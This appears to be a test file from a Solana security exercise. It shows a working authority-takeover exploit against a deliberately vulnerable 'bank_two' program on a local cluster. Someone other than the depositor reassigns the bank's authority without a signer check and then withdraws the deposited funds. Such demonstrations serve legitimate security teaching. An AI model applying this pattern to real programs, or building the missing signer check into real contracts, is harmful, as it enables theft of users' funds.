import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { BankTwo } from "../target/types/bank_two";
import { assert } from "chai";

describe("bank_two attack", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const payer = provider.wallet.payer!;

  const program = anchor.workspace.bank_two as Program<BankTwo>;
  const amount = new anchor.BN(1e5);
  const autority = anchor.web3.Keypair.generate();
    const bank_data = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("bank")],
      program.programId
    )[0];

  before(async()=>{
    const tx = new anchor.web3.Transaction().add(anchor.web3.SystemProgram.transfer({
      fromPubkey: payer.publicKey,
      toPubkey: autority.publicKey,
      lamports: anchor.web3.LAMPORTS_PER_SOL
    }));
    await provider.sendAndConfirm(tx, [payer]);
  });

  it("Deposit", async () => {
    // Add your test here.
    const tx = await program.methods
      .deposit(amount)
      .accounts({ authority: autority.publicKey })
      .signers([autority])
      .rpc({commitment: "confirmed"});
    const bank_data_fetch = await program.account.bank.fetch(bank_data);
    assert(bank_data_fetch.balance.eq(amount));
  });

  it("update authority", async()=>{
    // attack the authority field.
    // authority should be a signer type.
    await program.methods.updateAuth().accounts({
      newAuthority: payer.publicKey
    }).signers([payer]).rpc({commitment: "confirmed"});
    const bank_data_fetch = await program.account.bank.fetch(bank_data);
    assert(bank_data_fetch.authority.toBase58() == payer.publicKey.toBase58());
  });

  it("Withdraw", async () => {
    // withdraw from the bank.
    await program.methods.withdraw(amount).accounts({
      authority: payer.publicKey
    }).signers([payer]).rpc({commitment: "confirmed"});
    const bank_data_fetch = await program.account.bank.fetch(bank_data);
    assert(bank_data_fetch.balance.eq(new anchor.BN(0)));
  });
});
